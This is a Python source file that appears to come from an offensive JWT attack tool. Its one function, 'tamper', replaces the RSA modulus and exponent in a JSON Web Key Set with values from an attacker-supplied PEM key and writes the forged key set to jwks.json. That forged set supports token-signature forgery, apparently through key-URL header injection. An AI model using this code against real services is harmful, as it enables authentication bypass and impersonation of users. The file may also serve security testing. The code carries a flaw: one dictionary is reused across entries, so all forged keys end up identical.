import json

from termcolor import colored


def tamper(jwks, parsed_pem):

    """
        Iterates over original jwks values,
        replaces "n" and "e" with new ones extracted from PEM key,
        and writes new jwks data to file.
    """

    jwks_tampered = {}
    new_list = []
    new_dict = {}

    print(colored('\n----{   JWKS TAMPERING   }----\n', attrs=["bold"]))

    for obj in jwks:
        jwks_tampered[obj] = []
        for lst in jwks[obj]:
            jwks_tampered[obj].append({})
            for key, val in lst.items():
                if key == "n":
                    new_dict[key] = parsed_pem.n
                elif key == "e":
                    new_dict[key] = parsed_pem.e
                else:
                    new_dict[key] = val
            new_list.append(new_dict)
            jwks_tampered[obj] = new_list

    if jwks_tampered is not None:
        print(colored('[+] JWKS tampered successfully!', "green"))
    else:
        return

    try:
        jwks_file = "jwks.json"
        with open(jwks_file, "w") as file:
            json_data = json.dumps(jwks_tampered, indent=2)
            file.write(json_data)
        print(colored(f'[+] Tampered JWKS has been written at ./{jwks_file}!\n', "green"))
    except:
        print(colored("ERR: UNABLE TO WRITE JWKS TO FILE .", "red", attrs=["reverse"]))
        exit()


